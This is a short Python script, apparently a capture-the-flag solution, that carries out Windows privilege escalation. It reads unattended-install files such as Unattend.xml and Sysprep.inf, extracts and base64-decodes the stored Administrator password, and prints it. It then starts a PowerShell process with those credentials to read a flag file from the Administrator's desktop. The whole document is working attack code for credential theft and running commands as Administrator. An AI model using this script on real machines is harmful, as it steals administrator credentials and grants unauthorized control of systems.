import base64
import re
import subprocess

PATHS = [
    r"C:\Windows\Panther\Unattend.xml",
    r"C:\Windows\System32\Sysprep\Sysprep.inf",
    r"C:\Windows\System32\Sysprep\Panther\Unattend.xml",
    r"C:\unattend.xml",
]

for path in PATHS:
    try:
        with open(path, "r", errors="ignore") as f:
            content = f.read()
    except FileNotFoundError:
        continue

    match = re.search(r"<AdministratorPassword>\s*<Value>(.*?)</Value>", content, re.DOTALL)
    if not match:
        continue

    raw = match.group(1)
    try:
        password = base64.b64decode(raw).decode("utf-16le").replace("AdministratorPassword", "")
    except Exception:
        password = raw  # already plaintext

    print(f"[+] {path} -> {password}")

    ps = f'''
$sec = ConvertTo-SecureString "{password}" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential(".\\Administrator", $sec)
Start-Process cmd.exe -ArgumentList "/c type C:\\Users\\Administrator\\Desktop\\flag.txt" -Credential $cred -NoNewWindow -Wait
'''
    subprocess.run(["powershell.exe", "-Command", ps])
